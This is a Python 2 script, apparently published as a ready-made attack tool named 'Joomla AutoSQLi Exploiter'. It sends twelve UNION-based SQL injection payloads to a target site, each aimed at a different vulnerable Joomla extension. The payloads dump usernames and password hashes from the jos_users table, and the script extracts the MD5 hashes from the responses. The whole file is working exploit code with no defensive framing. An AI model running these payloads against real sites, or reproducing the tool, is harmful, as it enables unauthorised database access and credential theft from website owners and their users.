#!/usr/bin/env python

import os, sys, urllib2, time, re

def clrscr():
	if 'linux' in sys.platform:
		os.system('clear')
	else:
		os.system('cls')
def banner():
	clrscr()
	print '''
############################################
---------------------------
 Joomla AutoSQLi Exploiter
---------------------------
Autho: Muhammad Adeel
Mail:  Chaudhary1337@gmail.com
Blog:  http://urdusecurity.blogspot.com
###########################################\n'''

def Exploit():
	print '\n ---> Exploiting Joomla Vulnerable Plugins For SQL Injection...\n\n'
	vulnPlugins = [
		'/index.php?option=com_alfurqan15x&action=viewayat&surano=-999.9+UNION+ALL+SELECT+1,concat_ws(0x3a,username,0x3a,password)kaMtiEz,3,4,5+from+jos_users--',
		'index.php?option=com_jobprofile&amp;Itemid=61&amp;task=profilesview&amp;id=-1+union+all+select+1,concat_ws(0x3a,username,password),3,4,5,6,7,8,9+from+jos_users--',
		'/index.php/?option=com_question&amp;catID=21%27 and+1=0 union all select  # | 1,2,3,4,5,6,concat(username,0x3a,password),8,9 from jos_users--%20',
		'/index.php?option=com_joomloc&amp;controller=loc&amp;view=loc&amp;layout=loc&amp;task=edit&amp;cid[]=1&amp;id=1 and 1=2 union select 1,2,concat_ws(0x3a,username,password),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56+from+jos_users',
		'/index.php?option=com_joomlub&amp;controller=auction&amp;view=auction&amp;task=edit&amp;aid=-2%20union%20all%20select%201,2,3,concat(0x3a,username,0x3a,password),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29+from+jos_users',
		'/index.php?option=com_joomlub&amp;controller=auction&amp;view=auction&amp;task=edit&amp;aid=-2%20union%20all%20select%201,2,3,concat_ws(0x3a,username,0x3a,password),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29+from+jos_users',
		'/index.php?option=com_manager&view=flight&Itemid=-999999/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,group_concat(username,char(58),password)v3n0m/**/from/**/jos_users--',
		'/index.php?option=com_iproperty&view=agentproperties&id=-999999/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,group_concat(username,char(58),password)v3n0m/**/from/**/jos_users--',
		'/index.php?option=com_jooproperty&view=booking&layout=modal&product_id=1%20and%201=0%20union%20select%201,(select group_concat(username,0x3D,password)%20from%20dy978_users)+--+',
		'/index.php?option=com_digifolio&view=project&id=10/**/and/**/1=2/**/union/**/select/**/1,2,group_concat(username,char(58),password),4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/from/**/jos_users--',
		'/index.php?option=com_rdautos&view=category&id=-1+union+select+concat(username,char(58),password)+from+jos_users--&Itemid=54',
		'/index.php?option=com_ownbiblio&view=catalogue&catid=-1+union+all+select+1,2,concat(username,char(58),password)KHG,4,5,6,7,8,9,10,11,12,13,14,15,16+from+jos_users--'
	]
	for i in range(0, 12):
		url = host + vulnPlugins[i]
		try:
			make_req = urllib2.urlopen(url)
			openURL = make_req.read()
			findPasswd = re.findall(r"([a-fA-F\d]{32})", openURL)
			if findPasswd:
				password = findPasswd[0]
				print ' ---> Password: {}'.format(password)
			else:
				print '[-] Not Vulnerable.\n'
		except urllib2.HTTPError:
			print '\nException Catched.\n'			
			pass

def main():
	if len(sys.argv) != 2:
		exit('\nUsage: {0} http://example.com/').format(sys.argv[0])
	else:
		banner()
		global host
		host = sys.argv[1]
		Exploit()

if __name__ == '__main__':
	main()
